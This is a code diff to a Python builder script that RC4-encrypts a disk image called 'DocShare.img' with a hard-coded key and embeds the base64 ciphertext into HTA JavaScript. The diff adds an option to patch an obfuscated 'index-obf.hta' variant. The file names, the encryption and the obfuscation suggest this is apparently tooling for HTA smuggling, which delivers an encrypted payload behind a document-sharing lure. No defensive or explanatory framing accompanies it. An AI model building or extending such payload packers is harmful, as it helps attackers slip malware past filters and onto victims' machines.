@@ -1,3 +1,4 @@
+import argparse
 import os
 import re
 import base64
@@ -6,6 +7,9 @@ RC4_KEY = b'-4S@aAv;&T~2\\.e+3])N`C|"\\.3FTVH8NG5O$Hjh+~s^g\'G06ni"n{E2cujo"w^ln
 
 ENC_B64_RE = re.compile(r'(var encB64 = ")[^"]*(";)')
 KEY_B64_RE = re.compile(r'(var keyB64 = ")[^"]*(";)')
+# Second entry in the obfuscated string table (after 'Type'); safe to re-patch on re-runs.
+OBF_ENC_RE = re.compile(r"(\['Type',')(?:B64_ENC_DATA|[A-Za-z0-9+/=]+)(')")
+OBF_HTA_PATH = 'index-obf.hta'
 
 
 def rc4(key, data):
@@ -33,7 +37,41 @@ def replace_blob(content, pattern, new_value):
     return pattern.sub(rf'\g<1>{new_value}\g<2>', content, count=1)
 
 
+def patch_obf_hta(b64_ct, hta_path=OBF_HTA_PATH):
+    if not os.path.exists(hta_path):
+        print(f"[!] File not found: {hta_path}")
+        return 1
+
+    with open(hta_path, 'r', encoding='utf-8') as f:
+        obf = f.read()
+
+    updated = replace_blob(obf, OBF_ENC_RE, b64_ct)
+    if updated is None:
+        print(f"[!] Could not find B64_ENC_DATA placeholder in {hta_path}")
+        return 1
+
+    with open(hta_path, 'w', encoding='utf-8', newline='') as f:
+        f.write(updated)
+
+    print(f"[+] Updated B64_ENC_DATA in {hta_path}")
+    return 0
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description='Encrypt DocShare.img and embed ciphertext in HTA JavaScript.',
+    )
+    parser.add_argument(
+        '-O',
+        '--obf',
+        action='store_true',
+        help=f'Patch B64_ENC_DATA in {OBF_HTA_PATH}',
+    )
+    return parser.parse_args()
+
+
 def main():
+    args = parse_args()
     img_path = 'DocShare.img'
     hta_path = 'index.hta'
 
@@ -73,7 +111,11 @@ def main():
     with open(hta_path, 'w', encoding='utf-8', newline='') as f:
         f.write(updated)
 
-    print(f"[+] Updated image blobs in {hta_path} (JS unchanged)")
+    print(f"[+] Updated image blobs in {hta_path}")
+
+    if args.obf:
+        return patch_obf_hta(b64_ct)
+
     return 0
 
 
